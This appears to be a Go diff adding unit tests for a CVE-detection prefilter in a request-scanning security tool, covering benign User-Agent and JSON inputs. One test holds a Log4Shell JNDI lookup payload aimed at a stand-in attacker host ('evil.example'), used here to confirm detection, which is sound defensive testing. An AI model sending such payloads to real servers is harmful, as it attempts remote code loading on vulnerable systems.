@@ -4,6 +4,30 @@ import (
 	"testing"
 )
 
+func TestCVEPrefilterIgnoresBrowserUserAgentPunctuation(t *testing.T) {
+	req := BuildCVERequest("/api/users", "page=1", map[string]string{
+		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+		"Host":       "example.com",
+	}, nil, "")
+	if hasCVESuspiciousContent(req) {
+		t.Fatal("browser User-Agent punctuation should not force expensive CVE regex scanning")
+	}
+}
+
+func TestCVEPrefilterKeepsExploitPunctuation(t *testing.T) {
+	req := BuildCVERequest("/", "x=${jndi:ldap://evil.example/a}", nil, nil, "")
+	if !hasCVESuspiciousContent(req) {
+		t.Fatal("exploit punctuation should still enter CVE scanning")
+	}
+}
+
+func TestCVEPrefilterIgnoresNormalJSONPunctuation(t *testing.T) {
+	req := BuildCVERequest("/api/login", "", map[string]string{"Host": "example.com"}, []byte(`{"username":"admin","password":"test123"}`), "application/json")
+	if hasCVESuspiciousContent(req) {
+		t.Fatal("normal JSON punctuation should not force expensive CVE regex scanning")
+	}
+}
+
 func TestCVEDetector_PHPDeserialization(t *testing.T) {
 	d := NewCVEDetector()
 
